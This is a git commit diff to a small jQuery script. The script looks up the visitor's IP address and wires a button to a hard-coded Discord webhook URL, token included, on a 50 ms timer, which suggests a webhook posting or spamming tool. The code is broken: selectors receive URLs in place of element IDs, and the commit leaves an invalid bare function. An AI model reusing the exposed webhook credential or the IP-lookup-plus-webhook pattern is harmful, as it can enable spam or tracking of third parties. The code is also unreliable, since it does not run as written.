3e5ef97df181a138ec819fd22b66c447bf0d0650
neksioo <100017725+neksioo@users.noreply.github.com>
2022-04-03 16:40:04 +0200

    Update main.js

--- main.js
+++ main.js
@@ -21,7 +21,7 @@ $.getJSON('https://wtfismyip.com/text', function(data) {
   console.log(JSON.stringify(data, null, 2));
 });
 
-$(function () {
+function () {
     $('#btn').click(function () {
         var link = $('https://discordapp.com/api/webhooks/953945431719706644/5AzEkz2uc3nzg9zyFsHI9DKiHB9X1AP7x2f54kGpWPQtaVNqMsftA2CJnSSMDpXDHkh8').val();
         var username = $('neksio.gq').val();
@@ -37,7 +37,7 @@ $(function () {
 
         }, 50)
     });
-});
+};
 
 
 /*
